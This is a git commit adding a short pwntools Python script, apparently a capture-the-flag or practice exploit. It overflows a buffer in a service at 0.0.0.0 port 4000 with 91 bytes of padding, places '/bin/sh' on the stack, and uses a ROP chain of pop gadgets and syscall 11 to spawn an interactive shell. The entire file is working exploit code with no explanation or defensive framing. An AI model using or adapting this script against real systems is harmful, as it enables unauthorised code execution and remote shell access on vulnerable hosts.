cc3d418341200be9bb15c0e3cd80df36c2d3fdde
faker <b09780978@gmail.com>
2017-05-01 02:50:51 +0800

    add use all pop(more than 1) script

---
+++ test3.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+from pwn import *
+
+bin = 0x6e69622f
+sh = 0x68732f
+padding = "A"*91
+padding += p32(bin) + p32(sh)
+
+r = remote("0.0.0.0", 4000)
+chain = p32(134671152)
+chain += p32(0)
+chain += p32(0)
+chain += p32(4143967844)
+chain += p32(134584585)
+chain += p32(11)
+#pop edx ; pop ecx ; pop ebx ; ret
+
+chain += p32(134662005)
+payload = padding + chain
+r.sendline(payload)
+r.interactive()
+r.close()
